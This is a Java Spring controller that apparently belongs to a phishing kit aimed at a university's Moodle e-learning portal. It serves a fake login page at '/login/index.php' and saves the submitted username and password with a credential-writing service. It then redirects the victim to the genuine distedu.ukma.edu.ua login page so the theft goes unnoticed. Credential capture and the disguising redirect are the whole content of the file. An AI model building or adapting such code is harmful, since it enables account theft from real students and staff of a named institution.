package com.example.DistEdu.controller;


import com.example.DistEdu.dto.UserDto;
import com.example.DistEdu.services.FileWriterService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.servlet.resource.NoResourceFoundException;

@Controller
public class MainController {

    private final FileWriterService writerService;

    public MainController(
            @Qualifier("fileWriterService") FileWriterService fileWriterService
    ){
        this.writerService = fileWriterService;
    }


    @GetMapping("/login/index.php")
    public String getMainPage(Model model){
        model.addAttribute("user", new UserDto());
        return "main";
    }


    @PostMapping("/login/index.php")
    public String postMainPage(@ModelAttribute("user") UserDto userDto){

        writerService.writeCredentials(userDto);

        return  "redirect:https://distedu.ukma.edu.ua/login/index.php";
    }



}
